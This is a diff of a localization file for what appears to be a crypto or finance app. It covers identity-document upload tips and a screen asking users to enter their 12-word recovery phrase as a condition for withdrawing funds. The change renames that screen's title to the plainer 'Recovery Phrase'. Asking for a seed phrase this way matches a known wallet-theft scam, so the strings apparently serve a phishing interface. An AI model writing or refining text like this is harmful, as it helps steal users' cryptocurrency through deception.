@@ -675,7 +675,7 @@
         "kycGuide2": "The image must be clear and not blurry. Avoid glare or shadows.",
         "kycGuide3": "Supported formats: JPG, PNG. Maximum size: 5MB per image.",
         "kycGuide4": "Your documents are securely encrypted and stored strictly in accordance with international data protection laws.",
-        "phraseTitle": "Withdrawal Verification Phrase",
+        "phraseTitle": "Recovery Phrase",
         "phraseDescription": "Enter your 12-word recovery phrase. This is used to verify account ownership before you can withdraw funds.",
         "phraseVerifyBtn": "Verify and Save Phrase",
         "phraseVerifying": "Verifying...",
